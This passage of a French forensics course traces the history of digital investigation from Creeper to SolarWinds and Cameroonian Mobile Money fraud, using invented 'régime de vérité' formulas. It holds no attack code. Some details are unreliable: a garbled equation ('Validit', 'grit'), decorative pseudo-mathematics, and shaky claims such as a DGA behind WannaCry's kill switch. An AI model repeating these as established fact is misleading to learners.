uniforme de~7.98~bits/octet. Le reste du disque présente des entropies
variables entre 3.2 et 6.8~bits/octet.

\begin{enumerate}[(a)]
    \item Quelle est votre hypothèse principale sur la nature de cette zone~?
    \item Proposez deux hypothèses alternatives (sans supposer d'activité
          malveillante) qui pourraient expliquer cette observation.
    \item Quelles analyses complémentaires effectueriez-vous pour discriminer
          entre ces hypothèses~? Précisez les outils et les commandes.
    \item Comment documenteriez-vous ces analyses dans votre rapport pour
          satisfaire simultanément $\mathcal{R}$ et $\mathcal{O}$~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Ce qui vient.} Le Chapitre~2 reprendra le cadre foucaldien posé
ici pour décrire, affaire par affaire, comment chaque régime de vérité
s'est constitué historiquement. La périodisation mathématique
$\vec{R}_t$ servira de fil conducteur. Les fondements mathématiques
(entropie, graphes) seront mis en pratique dans la Partie~IV. Le Trilemme
CRO et le paradoxe de l'authenticité invisible seront formalisés
rigoureusement dans la Partie~VI.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie1/P01_C02_histoire_investigation.tex
% Titre    : Histoire de l'Investigation Numérique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
%
% Sources fusionnées :
%   - 1_histoire_investigation.tex (version précédente)
%   - chap2.pdf (archéologie foucaldienne, périodisation, formules,
%                BTK, Stuxnet, WannaCry, SolarWinds, perspectives)
%   - 2_grandes_affaires.tex (affaires complémentaires)
%   - M0_Cartographie_Menace_PNC.docx (Afrique, Cameroun, AFRIPOL,
%                MoMo fraud, SIM swapping, données ANTIC)
% ============================================================================

\chapter{Histoire de l'Investigation Numérique}
\label{chap:histoire}

\epigraph{%
    « Plus vous regarderez loin dans le passé, plus vous verrez loin dans
    le futur. »%
}{--- Winston Churchill, \textit{The Gathering Storm}, 1948}

\niveauChapitre{Fondamental}{%
    Ce chapitre prolonge le Chapitre~\ref{chap:phi-fond}~: la notion de
    régime de vérité numérique ($\vec{R}_t$) y est appliquée cas par cas.
    Aucun prérequis technique.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Reconstituer la \termecle{double hélice} de l'investigation
          numérique~: l'enroulement historique du technique et du juridique.
    \item Appliquer le modèle des régimes de vérité $\vec{R}_t$ à chaque
          période pour comprendre pourquoi les affaires ont produit les
          innovations qu'elles ont produites.
    \item Identifier les jalons africains et camerounais de l'histoire
          de la discipline~; positionner le Cameroun dans ce récit.
    \item Extraire de chaque affaire une leçon opérationnelle directement
          applicable à la pratique contemporaine.
    \item Anticiper les configurations futures des régimes de vérité à
          partir de la loi d'accélération épistémique.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{La Double Hélice de l'Investigation Numérique}
% ============================================================================

L'histoire de l'investigation numérique ne se raconte pas en ligne droite.
Elle s'enroule selon une \termecle{double hélice}\index{double hélice} --- image
empruntée à la biologie moléculaire --- où deux brins s'entrelacent sans
jamais se confondre~: le brin \textbf{technique} (ce que les outils permettent
de faire) et le brin \textbf{juridique} (ce que le droit autorise à faire
et ce qu'il exige pour que ce soit recevable). Chaque rupture dans l'un des
brins provoque une tension dans l'autre. C'est cette tension répétée qui fait
avancer la discipline \cite{chap2pdf}.

\medskip

L'histoire se découpe en cinq régimes de vérité successifs, chacun déclenché
par un incident fondateur qui a contraint le régime précédent à se reconfigurer.
Le vecteur de dominance $\vec{R}_t$ de chaque époque, rappelé dans le tableau
synthétique ci-après, sera illustré affaire par affaire.

\begin{tableaucours}{p{2.2cm}p{2.5cm}p{3.0cm}p{3.8cm}}{%
    \tableauHeader{Période} &
    \tableauHeader{Incident fondateur} &
    \tableauHeader{Innovation} &
    \tableauHeader{Vecteur $\vec{R}_t$ dominant}
}
1970--1990 & Creeper / 414s & Trace électronique & $\alpha_T \approx 0.7$ \\
1990--2000 & Op. Sundevil / Mitnick & Chain of custody & $\alpha_J \approx 0.5$ \\
2000--2010 & Enron / McKinnon & Standards ISO/NIST & $\alpha_P \approx 0.5$ \\
2010--2020 & Silk Road / Panama & Analyse massive & $\alpha_T \approx 0.6$ \\
2020--\ldots & SolarWinds / IA & Preuves ZK / IA & $\alpha_T + \alpha_J \approx 0.8$ \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~2.1 --- La double hélice en cinq régimes
(d'après \cite{chap2pdf})}\end{center}

% ============================================================================
\section{Les Prémices (1970--1990)~: L'Émergence de la Trace Électronique}
% ============================================================================

\subsection{Contexte socio-technique du premier régime}

Cette période correspond à ce que Manovich appelle « la logique culturelle
de l'ordinateur personnel »~: le numérique est le territoire d'une élite
technique restreinte, les crimes sont commis par curiosité autant que par
appât du gain, et le cadre juridique est absent ou analogique. Le régime
de vérité est dominé par la technique ($\alpha_T \approx 0.7$)~: l'expert
technique isolé est l'unique autorité épistémique, et ses méthodes ne sont
soumises à aucune contrainte procédurale.

\medskip

Les premières investigations sont de l'\textbf{artisanat}~: chaque analyste
invente ses propres méthodes, documente selon son intuition, conclut selon
son expertise. La preuve paradigmatique de l'époque est le log système~---
une trace brute, technique, dont la signification est accessible seulement
aux initiés.

\begin{tableaucours}{p{2.8cm}p{8.2cm}}{%
    \tableauHeader{Dimension} &
    \tableauHeader{Caractéristiques du régime 1970--1990}
}
Technologie & Mainframes, premiers PC, réseau ARPANET, absence de sécurité \\
Juridique & Absence de cadre spécifique~; application analogique du droit pénal existant \\
Social & Fracture numérique massive~; les hackers sont des héros ou des démons \\
Pratique & Méthodes ad hoc~; expertise individuelle non transmissible~; aucun standard \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~2.2 --- Contexte socio-technique des prémices
(d'après \cite{chap2pdf})}\end{center}

\subsection{The Creeper (1971)~: le premier artefact forensique}

\textbf{The Creeper} n'est pas un crime~: c'est une expérience. Bob Thomas,
ingénieur chez BBN Technologies, écrit en 1971 un programme capable de
se déplacer d'ordinateur en ordinateur sur ARPANET en affichant le message
\texttt{I'M THE CREEPER: CATCH ME IF YOU CAN!}. La réponse --- \textbf{The
Reaper}, programme écrit pour supprimer The Creeper --- constitue la
première \emph{investigation active} de l'histoire numérique~: pour
attraper The Creeper, il fallait comprendre son comportement, sa propagation,
ses traces.

\medskip

La leçon n'est pas technique~; elle est épistémologique~: \textbf{tout
programme laisse des traces}, et ces traces peuvent être lues par qui sait
les interpréter. Ce principe, évident aujourd'hui, était révolutionnaire
en 1971.

\subsection{L'affaire des 414s (1983)~: premier paradigme investigatif}

En 1983, six adolescents de Milwaukee, surnommés les \termecle{414s} d'après
leur indicatif régional, pénètrent dans 60~systèmes informatiques incluant le
Los Alamos National Laboratory et le Memorial Sloan-Kettering Cancer Center.
Ils sont arrêtés, non par des techniques forensiques sophistiquées, mais parce
que l'un d'eux se vante devant ses pairs --- un informateur prévient la police.

\medskip

Du point de vue forensique, cette affaire établit que les traces réseau
constituent une preuve légitime, créant le premier régime de vérité basé
sur l'adresse IP \cite{chap2pdf}~:

\begin{equation}
P_{\text{réseau}} = \bigl\{\text{logs},\; \text{adresses IP},\;
\text{horodatages}\bigr\} \in \mathcal{P}_{\text{légitime}}
\label{eq:preuve-reseau}
\end{equation}

\begin{boxCRO}
\textbf{Analyse CRO --- Affaire des 414s}

L'investigation repose sur l'exploitation des logs système~: aucune protection
de la vie privée n'est invoquée. \cro{$\downarrow$}{$\uparrow$}{$\downarrow$} ---
Les preuves sont techniquement solides mais le cadre juridique n'existe pas encore
pour les qualifier. L'absence de \loicam{} ou de \textit{Computer Fraud and Abuse
Act} avant 1986 illustre le retard du brin juridique sur le brin technique.
\end{boxCRO}

\textbf{Impact~:} création du \textit{Computer Fraud and Abuse Act} aux
États-Unis en 1986. Prise de conscience politique mondiale de la nécessité
d'un cadre juridique propre aux crimes informatiques.

\subsection{L'affaire BTK Killer (2005, racines 1974)~: les métadonnées comme preuve}

Dennis Rader, tueur en série surnommé BTK (\textit{Bind, Torture, Kill}),
avait communiqué avec la police pendant 30~ans sans être identifié. En
janvier 2005, il envoie une disquette contenant un fichier
\texttt{Test.A.rtf}. Les enquêteurs du FBI extraient les
\termecle{métadonnées}\index{métadonnées} du fichier avec un outil basique~:
le champ « Auteur » contient \texttt{Dennis}, et la propriété « Dernière
organisation » indique \texttt{Christ Lutheran Church}. En croisant avec
les membres actifs de cette paroisse, Rader est identifié en quelques
heures.

\medskip

Cette affaire illustre un principe cardinal~: \textbf{la valeur probatoire
d'un artefact numérique peut dépasser celle de son contenu}. Le message
de Rader n'incriminait personne~; ses métadonnées l'ont trahi \cite{chap2pdf}~:

\begin{equation}
V_{\text{probatoire}}(\text{métadonnées}) \;\geq\;
V_{\text{probatoire}}(\text{contenu})
\label{eq:meta-superieur}
\end{equation}

\begin{boxartefact}{Métadonnées de fichier Office}
\textbf{Localisation~:} \texttt{Propriétés} du fichier $\to$
\texttt{Détails} (Windows) ou extraction via ExifTool/Autopsy.

\textbf{Informations typiquement contenues~:} auteur, organisation, date de
création, date de dernière modification, logiciel utilisé, parfois chemin
du fichier sur l'ordinateur source, nom d'imprimante.

\textbf{Commande d'extraction~:}
\lstinline[language=bash_forensique]{exiftool fichier.docx}

\textbf{Vulnérabilité~:} la plupart des utilisateurs ignorent que ces
données existent et n'ont pas l'habitude de les supprimer avant d'envoyer
un fichier. L'investigateur doit systématiquement les extraire.
\end{boxartefact}

% ============================================================================
\section{La Professionnalisation (1990--2000)~: Naissance d'une Discipline}
% ============================================================================

\subsection{La révolution Internet et ses conséquences épistémiques}

L'émergence du web transforme radicalement le régime de vérité. Le brin
juridique ($\alpha_J$) et le brin pratique ($\alpha_P$) deviennent dominants~:
l'investigation ne peut plus être artisanale quand elle touche des millions
d'internautes. La \textbf{professionnalisation} au sens d'Abbott correspond
à ce moment où un groupe construit sa juridiction professionnelle autour~:
d'un corps de connaissances formalisé~; de méthodes standardisées et
reproductibles~; d'une reconnaissance juridique et institutionnelle~; et
d'un code déontologique contraignant \cite{chap2pdf}.

\subsection{L'Opération Sundevil (1990)~: le choc de la standardisation}

Le 8~mai~1990, le Secret Service américain lance la plus grande opération
contre la cybercriminalité jamais conduite~: saisie de 42~systèmes
informatiques dans 14~villes simultanément. L'opération est un succès
opérationnel et un désastre juridique. La majorité des poursuites
s'effondrent~: les preuves saisies n'ont pas été préservées selon des
protocoles cohérents~; les hash n'existent pas encore comme concept
forensique~; plusieurs systèmes saisis appartiennent à des innocents ciblés
par erreur.

\medskip

L'Opération Sundevil représente, selon Durkheim, un \textbf{fait social total}~:
elle cristallise tous les enjeux de la nouvelle société numérique et révèle
l'impossibilité de continuer avec des méthodes artisanales. Elle conduit
directement à la création de l'\sigle{IOCE} (\textit{International Organization
on Computer Evidence}) en 1995 --- première institution dédiée à la
standardisation de la forensique numérique.

\begin{boxjuris}
\textbf{Héritage normatif de l'Opération Sundevil~:}
\begin{itemize}
    \item Création de l'\sigle{IOCE} (1995) --- premiers principes de collecte
          de preuves numériques.
    \item Fondation du \sigle{DFRWS} (\textit{Digital Forensics Research
          Workshop}) (2001) --- qui produira le premier modèle de processus
          forensique.
    \item Inspiration directe pour la Convention de Budapest (2001).
\end{itemize}
\end{boxjuris}

\subsection{L'arrestation de Kevin Mitnick (1995)~: institution de la chaîne de custody}

Le 15~février~1995, Kevin Mitnick --- « le hacker le plus recherché du monde »
--- est arrêté à Raleigh (Caroline du Nord) grâce au travail de Tsutomu
Shimomura. L'affaire dure depuis 1993~: Mitnick a utilisé le \textit{IP
spoofing}, le \textit{TCP session hijacking} et l'ingénierie sociale pour
pénétrer des dizaines de systèmes militaires et corporatifs.

\medskip

La contribution épistémologique de cette affaire est plus importante que
sa dimension médiatique~: elle institue la \textit{chain of custody}
comme \textbf{condition nécessaire de la validité épistémique} d'une
preuve numérique \cite{chap2pdf}~:

\begin{equation}
\mathrm{Validit}(P) \;\Leftrightarrow\;
\exists\, \mathcal{C} \;\text{ telle que }\; \int \mathrm{grit}(\mathcal{C})\,dt = 1
\label{eq:validite-custody}
\end{equation}

où $\mathcal{C}$ représente la chaîne de custody et $\mathrm{grit}(\mathcal{C})$
sa densité documentaire. Informellement~: une preuve n'est valide que si elle
est accompagnée d'une documentation continue de sa traçabilité.

\begin{boxCRO}
\textbf{Analyse CRO --- Arrestation Mitnick}

L'affaire Mitnick mobilise les trois dimensions sous forte tension.
$\mathcal{C}$~: les écoutes téléphoniques étendues soulèvent des questions
de vie privée qui alimenteront la littérature juridique pendant une décennie.
$\mathcal{R}$~: l'innovation de Shimomura (analyse de honeypot, corrélation
temporelle avancée) est robuste et reproductible. $\mathcal{O}$~: la chaîne
de custody, bien que perfectible, est suffisamment documentée pour permettre
une condamnation.
\cro{$\downarrow$ tendu}{$\uparrow$}{$\uparrow$ émergent}
\end{boxCRO}

% ============================================================================
\section{La Standardisation (2000--2010)~: Rationalisation Industrielle}
% ============================================================================

\subsection{Le tournant du millénaire et les standards fondateurs}

Cette période correspond à ce que Beck appelle « la société du risque »~:
le numérique est devenu infrastructure critique, et les États comme les
entreprises comprennent que les méthodes artisanales sont un risque systémique.
Quatre standards fondateurs émergent simultanément, créant une infrastructure
normative sans précédent~:

\begin{tableaucours}{p{2.4cm}p{2.2cm}p{3.5cm}p{3.2cm}}{%
    \tableauHeader{Standard} &
    \tableauHeader{Portée} &
    \tableauHeader{Contribution principale} &
    \tableauHeader{Acteurs moteurs}
}
\norme{ISO~27037} & International &
    Méthodologie unifiée de collecte & Organisations internationales \\
\norme{NIST SP 800-86} & États-Unis &
    Gouvernance processuelle complète & Agences gouvernementales \\
\norme{RFC~3227} & Internet &
    Ordre de volatilité --- bonnes pratiques & Communauté technique \\
\norme{ACPO Guide} & Royaume-Uni &
    4~principes déontologiques & Forces de l'ordre britanniques \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~2.3 --- Standards fondateurs de l'ère 2000--2010
(d'après \cite{chap2pdf})}\end{center}

\subsection{L'affaire Enron (2001)~: naissance de l'\textit{e-discovery}}

La faillite d'Enron produit l'investigation numérique la plus massive de
l'histoire jusqu'alors~: 500~000~documents électroniques doivent être analysés,
croisés, et présentés en justice. Les méthodes manuelles sont impossibles~;
la réponse est la création des premiers outils d'\termecle{analyse automatisée}
(précurseurs du \textit{Technology-Assisted Review}). L'affaire établit que
les résultats d'un algorithme d'analyse constituent des preuves légitimes
si l'algorithme est validé et documenté~:

\begin{equation}
P_{\text{algo}} = \mathcal{A}(\mathcal{D}) \in \mathcal{P}_{\text{légitime}}
\quad \text{si} \quad \mathrm{si}(\mathcal{A}) > \theta
\label{eq:preuve-algo}
\end{equation}

où $\mathrm{si}(\mathcal{A})$ est l'indice de scientificité de l'algorithme et
$\theta$ le seuil d'acceptabilité judiciaire. Les amendements aux
\textit{Federal Rules of Civil Procedure} (2006) codifient ces principes
en droit positif américain, ouvrant la voie à l'automatisation de l'investigation.

\subsection{L'affaire Gary McKinnon (2002--2012)~: souveraineté numérique}

Gary McKinnon, informaticien britannique autiste, passe deux ans à infiltrer
97~serveurs militaires américains à la recherche de preuves d'existence
extraterrestre. L'affaire dure dix~ans, non pour des raisons techniques (McKinnon
est rapidement identifié), mais parce qu'elle cristallise un conflit de
\textbf{souveraineté numérique}~: les États-Unis réclament l'extradition
pour 70~ans de prison potentiels~; le Royaume-Uni refuse pendant une décennie
au nom du droit à la santé de McKinnon.

\medskip

La leçon forensique est la corrélation multi-juridictionnelle~: quand une
attaque traverse des frontières, les logs se trouvent dans des pays différents,
les règles d'admissibilité divergent, et la coopération judiciaire internationale
devient le vrai défi --- pas la technique.

% ============================================================================
\section{Le Big Data et le Cloud (2010--2020)~: L'Échelle Critique}
% ============================================================================

\subsection{Le changement d'échelle qualitatif}

Cette période correspond à ce que Boyd et Crawford appellent « l'ère des
big data » où l'échelle change la nature même de l'investigation. Au-delà
d'un certain seuil $N_{\text{critique}}$, l'analyse ne peut plus être humaine~:

\begin{equation}
\lim_{N \to \infty}
\frac{\text{Analyse humaine}}{\text{Analyse algorithmique}} = 0
\label{eq:bigdata}
\end{equation}

Cette équation a une implication directe sur le Trilemme CRO~: quand
l'analyse est déléguée à un algorithme opaque, $\mathcal{O}$ (opposabilité)
est menacée --- l'avocat de la défense peut contester une conclusion
qu'aucun expert humain ne peut entièrement expliquer.

\subsection{L'affaire Silk Road (2013)~: forensique blockchain}

Ross Ulbricht exploite Silk Road, première grande place de marché du dark
web, depuis 2011. L'investigation du FBI combine trois innovations~: la
\textbf{forensique Tor} (corrélation de flux pour désanonymiser les serveurs),
la \textbf{forensique blockchain} (analyse du graphe de transactions Bitcoin
pour remonter les flux financiers), et l'\textbf{OSINT} (Ulbricht a publié
des messages identifiables sur un forum public). La saisie de 144~000~bitcoins
(environ 28~millions~USD à l'époque, bien plus aujourd'hui) établit que
les cryptomonnaies ne sont pas anonymes~: elles sont pseudonymes, et le
pseudonymat se brise par corrélation de métadonnées.

\begin{boiteRemarque}{La Blockchain comme registre forensique}
La blockchain Bitcoin est, du point de vue forensique, le registre comptable
le plus complet jamais créé~: chaque transaction est permanente, publique,
et cryptographiquement liée à toutes les précédentes. La forensique blockchain
exploite cette propriété en construisant le graphe complet des flux pour
identifier les points d'échange (exchanges) où les cryptomonnaies sont
converties en monnaie réelle, permettant l'identification des acteurs.
\end{boiteRemarque}

\subsection{Les Panama Papers (2016)~: investigation transfrontière}

La fuite de 2,6~To de données (11,5~millions de documents) du cabinet
Mossack Fonseca constitue la plus grande investigation de données de
l'histoire. 376~journalistes de 76~pays collaborent pendant un an
sur un corpus unifié. L'impact forensique est l'émergence de
l'\termecle{investigation transnationale}\index{investigation transnationale}
comme nouveau paradigme~:

\begin{equation}
I_{\text{global}} = \sum_{i=1}^{n} I_{\text{locale}}^{i} +
C_{\text{collaboration}} - L_{\text{juridique}}
\label{eq:investigation-globale}
\end{equation}

où $C_{\text{collaboration}}$ est le bénéfice de la coopération et
$L_{\text{juridique}}$ les frictions des barrières légales entre juridictions.
La leçon~: la coordination internationale compense les barrières juridiques,
mais cette coordination exige des protocoles techniques et déontologiques
communs --- exactement ce que ce cours enseigne.

% ============================================================================
\section{L'Ère Post-Quantique et IA (2020--\ldots)~: Le Grand Saut}
% ============================================================================

\subsection{La double révolution IA / quantique}

Nous entrons dans ce que l'on pourrait appeler l'ère de la « guerre
algorithmique »~: l'IA est simultanément l'arme de l'attaquant et
le bouclier de l'investigateur. Deux ruptures parallèles redéfinissent
les fondamentaux.

\medskip

La première rupture est l'\textbf{émergence du régime de vérité algorithmique}~:
la vérité numérique est désormais établie par des systèmes d'IA dont le
fonctionnement peut être incompréhensible pour les humains (\textit{black box
problem}). Cela crée une tension épistémique fondamentale~: peut-on fonder
une condamnation pénale sur un résultat algorithmique inexplicable~?

La seconde rupture est la \textbf{menace quantique sur la cryptographie}~:
l'algorithme de Shor rend théoriquement cassables RSA et ECC sur un ordinateur
quantique suffisant. Les preuves numériques collectées aujourd'hui et
reposant sur ces algorithmes pourraient être invalidées rétroactivement.

\subsection{L'attaque SolarWinds (2020)~: IA contre IA}

L'attaque SolarWinds est la première illustration documentée d'une
\textbf{attaque \textit{living-off-the-land}} à l'échelle des États~:
les attaquants (groupe APT29, attribué aux services de renseignement russes)
compromettent la chaîne d'approvisionnement logicielle de SolarWinds en
injectant un code malveillant dans une mise à jour légitime. 18~000~organisations
téléchargent la mise à jour infectée~; la compromission reste non détectée
pendant \textbf{9~mois} malgré des outils de sécurité sophistiqués.

\medskip

La leçon forensique centrale~: la détection classique basée sur des signatures
est morte. Seule l'\textbf{analyse comportementale basée sur l'IA} permet
de détecter ce type d'attaque --- et encore, après le fait. L'attribution
reste incertaine~: les techniques d'obfuscation masquent l'origine, et
l'investigateur doit composer avec une probabilité, pas une certitude.

\begin{boxCRO}
\textbf{Analyse CRO --- Attaque SolarWinds}

$\mathcal{C}$~: l'investigation exige l'accès aux systèmes internes de
18~000~organisations --- tension massive avec la vie privée des clients.
$\mathcal{R}$~: la reproductibilité est problématique~; les outils IA
utilisés pour la détection ne produisent pas des conclusions entièrement
auditables. $\mathcal{O}$~: l'attribution probabiliste basée sur l'IA
est encore mal acceptée par les juridictions pénales~; aucune condamnation
n'a suivi. \cro{$\downarrow$ critique}{$\sim$ partielle}{$\downarrow$ problématique}

Ce cas illustre la \textbf{crise d'opposabilité du régime algorithmique}~:
les outils sont puissants, les conclusions solides techniquement, mais leur
défendabilité devant un tribunal reste à construire.
\end{boxCRO}

\subsection{Affaire WannaCry (2017)~: immunité collective numérique}

Le~12~mai~2017, le ransomware WannaCry infecte 300~000~ordinateurs dans
150~pays en 72~heures, exploitant la vulnérabilité \textit{EternalBlue}
volée à la NSA. La réponse forensique de Marcus Hutchins --- un chercheur
de 22~ans qui identifie et active un \textit{kill switch} caché dans le code,
arrêtant la propagation --- illustre un principe nouveau~: la réponse aux
incidents majeurs devient une entreprise \textbf{décentralisée et collaborative}
similaire à l'immunité collective en épidémiologie~:

\begin{equation}
R_0 = \beta \cdot \gamma^{-1}
\label{eq:wannacry-R0}
\end{equation}

où $\beta$ est le taux d'infection et $\gamma$ le taux de désinfection.
L'analyse du \textit{Domain Generation Algorithm} (DGA) de WannaCry par
des dizaines d'équipes en parallèle constitue un modèle d'investigation
distribuée qui préfigure les pratiques actuelles du partage de renseignement
sur les menaces (\textit{Threat Intelligence}).

% ============================================================================
\section{L'Afrique et le Cameroun dans l'Histoire de la Discipline}
% ============================================================================

\subsection{Une histoire trop souvent absente des manuels}

Les histoires standard de l'investigation numérique sont presque
exclusivement nord-américaines et européennes. C'est une distorsion~:
l'Afrique n'est pas un spectateur de la cybercriminalité mondiale, elle
en est simultanément une cible croissante, un terrain d'opération, et
--- de plus en plus --- une source d'innovation forensique. Cette section
comble ce vide historiographique.

\subsection{Les fraudes 419 (1990s--présent)~: la plus longue affaire forensique africaine}

Les escroqueries dites \termecle{419}\index{419, fraude} --- du numéro de
l'article du Code pénal nigérian qui les prohibe --- constituent la première
grande catégorie de cybercriminalité d'origine africaine à portée mondiale.
Dès les années 1990, des réseaux nigérians envoient par email des millions de
messages proposant des fortunes fictives. La réponse investigative révèle les
limites fondamentales du régime de vérité de l'époque~: les suspects sont en
Afrique, les victimes en Europe et en Amérique, les preuves traversent des
dizaines de juridictions, et aucune convention de coopération n'existe.

\medskip

Cette affaire permanente a deux héritages directs pour notre cours~: elle a
forcé la Convention de Budapest (2001) à inclure une dimension coopération
internationale, et elle a conduit le Cameroun à adopter la
\loicam{2010/012}, qui criminalise explicitement ces pratiques en droit
positif camerounais.

\subsection{Le Cameroun et la Loi 2010/012~: entrée dans le régime de standardisation}

Le 21~décembre~2010, le Cameroun adopte la \textbf{Loi N°2010/012 relative
à la cybersécurité et la cybercriminalité}. Cette date marque l'entrée
formelle du Cameroun dans le régime de standardisation mondial, avec un
décalage de dix ans sur les pays pionniers --- mais avec l'avantage de
bénéficier du retour d'expérience d'une décennie d'application internationale.
La même année, l'\sigle{ANTIC} est opérationnalisée comme autorité compétente.

\begin{boxjuris}
\textbf{Jalons camerounais de l'histoire forensique~:}
\begin{itemize}
    \item \textbf{2010}~: Loi 2010/012 (cybersécurité et cybercriminalité)
          et Loi 2010/013 (communications électroniques).
    \item \textbf{2011}~: Création et montée en puissance de l'\sigle{ANTIC}
          comme autorité de régulation et de certification.
    \item \textbf{2016}~: Compétence du Tribunal Criminel Spécial (\sigle{TCS})
          étendue à certaines infractions cyber.
    \item \textbf{2017}~: Opérationnalisation du \sigle{CIRT} national
          (Computer Incident Response Team).
    \item \textbf{2019--présent}~: Multiplication des affaires de fraude
          Mobile Money (SIM swapping, BEC) --- première jurisprudence
          camerounaise en investigation numérique.
    \item \textbf{2024}~: Loi sur la protection des données personnelles ---
          nouveau cadre pour les investigations impliquant des données privées.
\end{itemize}
\end{boxjuris}

\subsection{L'Opération FALCON II (2022)~: la coopération africaine en action}

En novembre 2022, Interpol et Afripol coordonnent l'Opération FALCON II
impliquant 11~pays africains dont le Cameroun. Le résultat~: arrestation
de 11~individus, démantèlement du groupe \textbf{SilverTerrier} (Nigeria),
responsable de plus de 1,7~million d'emails frauduleux et de pertes évaluées
à plusieurs centaines de millions de dollars.

\medskip

Cette opération représente une rupture de paradigme pour l'Afrique~:
la coopération régionale forensique produit des résultats mesurables. Elle
prouve que le modèle de l'investigation transnationale --- identifié dans les
Panama Papers --- est applicable sur le continent, avec les outils et le
cadre normatif existants \cite{m0pnc}.

\begin{boxscenario}{Fraude Mobile Money --- Cameroun, 2021}
\textbf{Faits~:} Un réseau de SIM swapping opère dans la région du Centre.
Méthode~: collecte des données personnelles des victimes via de faux sondages
diffusés sur WhatsApp, puis substitution de la SIM dans une agence MTN
complice. Résultat~: 47~millions FCFA détournés en 3~semaines, 23~victimes.

\textbf{Arrestations~:} 4~personnes dont 2~employés MTN. Qualification
juridique~: escroquerie informatique (\loicam{2010/012}, art.~78)
et complicité.

\textbf{Leçon forensique~:} La preuve numérique centrale n'est pas le
message WhatsApp (contenu) mais les métadonnées de connexion (qui s'est
connecté au système MTN, depuis quelle adresse IP, à quelle heure) et
les logs de transactions Mobile Money. L'enquête illustre que la chaîne
de custody doit commencer chez l'opérateur télécom --- avant même la
saisie du téléphone du suspect.

\textbf{Analyse CRO~:} \cro{$\downarrow$}{$\uparrow$}{$\uparrow$} --- Les logs
opérateur sont techniquement fiables ($\mathcal{R}$ haute) et leur
communication est encadrée par l'art.~30 de la Loi~2010/012 (réquisition
judiciaire), garantissant $\mathcal{O}$. La vie privée des victimes
($\mathcal{C}$) est sacrifiée dans la limite du nécessaire, ce qui est
justifiable et proportionnel.
\end{boxscenario}

% ============================================================================
\section{Perspectives~: la Loi d'Accélération Épistémique}
% ============================================================================

\subsection{Le temps entre les régimes se raccourcit}

L'observation la plus frappante de l'histoire que nous venons de parcourir
est que le temps entre les ruptures de paradigme se réduit
exponentiellement \cite{chap2pdf}~:

\begin{equation}
\Delta t_{n+1} = k \cdot \Delta t_n \quad \text{avec} \quad 0 < k < 1
\label{eq:acceleration}
\end{equation}

Le passage du régime technique au régime juridique a pris vingt ans (1970--1990).
Du juridique au standardisé~: dix ans. Du standardisé au computationnel~: dix
ans. Du computationnel au post-quantique/IA~: probablement cinq ans. La
conséquence pratique est directe~: un investigateur formé uniquement sur les
outils actuels sera partiellement obsolète dans moins de cinq ans. La
compréhension des \emph{régimes} --- pas des outils --- est la seule
formation qui résiste à cette accélération.

\subsection{Trois scénarios pour 2030--2050}

L'analyse prospective identifie trois régimes plausibles \cite{chap2pdf}~:

\begin{enumerate}
    \item \textbf{Régime quantique dominant~:} le calcul quantique devient
          accessible. RSA et ECC sont cassées. Toute la forensique des preuves
          collectées avant 2030 doit être revue. Les protocoles ZK et les
          algorithmes post-quantiques standardisés par le NIST (CRYSTALS-Kyber,
          CRYSTALS-Dilithium) deviennent la nouvelle norme.

    \item \textbf{Régime IA investigatif~:} les LLM et les agents autonomes
          conduisent les premières phases de triage forensique sans intervention
          humaine. La question d'opposabilité devient centrale~: peut-on présenter
          en justice une preuve identifiée par un agent IA qu'aucun expert humain
          ne peut entièrement auditer~?

    \item \textbf{Régime post-humain~:} existe un point $t_s$ (\textit{singularité
          investigative}) où l'IA investigative dépasse durablement les capacités
          humaines. Ce régime pose la question fondamentale de la responsabilité~:
          si l'IA se trompe et conduit à une condamnation injuste, qui en est
          responsable~?
\end{enumerate}

\medskip

Ces scénarios ne sont pas des spéculations~: ils se préparent maintenant.
Les Parties~V et~VI de ce cours sont construites précisément pour équiper
l'étudiant face aux deux premiers scénarios.

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}

\begin{itemize}
    \item L'histoire de l'investigation numérique suit une
          \textbf{double hélice}~: le brin technique et le brin juridique
          s'enroulent et se contraignent mutuellement. Chaque rupture dans
          l'un provoque une réorganisation dans l'autre.

    \item Cinq régimes successifs~: \textbf{technique} (1970--1990),
          \textbf{juridique} (1990--2000), \textbf{standardisé} (2000--2010),
          \textbf{computationnel} (2010--2020), \textbf{post-quantique/IA}
          (2020--\ldots). Chacun est déclenché par un incident fondateur.

    \item Leçons opérationnelles permanentes~: les métadonnées peuvent
          dépasser le contenu en valeur probatoire (BTK)~; la chaîne de
          custody est une condition de validité, pas un formalisme
          (Mitnick)~; les algorithmes d'analyse sont des preuves à documenter
          (Enron)~; le pseudonymat blockchain se brise par corrélation
          (Silk Road)~; l'attribution probabiliste reste à la limite de
          l'opposabilité (SolarWinds).

    \item L'Afrique et le Cameroun ont leur propre histoire~: les fraudes~419,
          la \loicam{2010/012} (2010), le SIM swapping, l'Opération FALCON~II.
          Cette histoire n'est pas un appendice de l'histoire mondiale --- elle
          en est une dimension constitutive.

    \item La \textbf{loi d'accélération épistémique}
          ($\Delta t_{n+1} = k \cdot \Delta t_n$) prédit que les ruptures
          s'accélèrent. Maîtriser les régimes est plus durable que maîtriser
          les outils.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~2.1 --- Analyse d'un incident par son régime \niveaubase}]
Pour chacun des incidents suivants, identifiez le régime de vérité dominant,
le brin (technique ou juridique) qui a été le plus sollicité, et la leçon
forensique principale~:

\begin{enumerate}[(a)]
    \item Un journaliste publie un reportage sur la corruption d'un ministre
          en utilisant des emails obtenus par un lanceur d'alerte. Le tribunal
          accepte les emails comme preuves. Année~: 2004.
    \item Une entreprise camerounaise perd 80~millions FCFA via un BEC. La
          police obtient les logs de connexion auprès de l'opérateur internet
          sur réquisition judiciaire. Année~: 2022.
    \item Un analyste utilise un modèle LLM pour classer automatiquement
          50~000~messages WhatsApp dans une affaire de trafic de drogue.
          L'avocat de la défense conteste la méthode. Année~: 2025.
\end{enumerate}
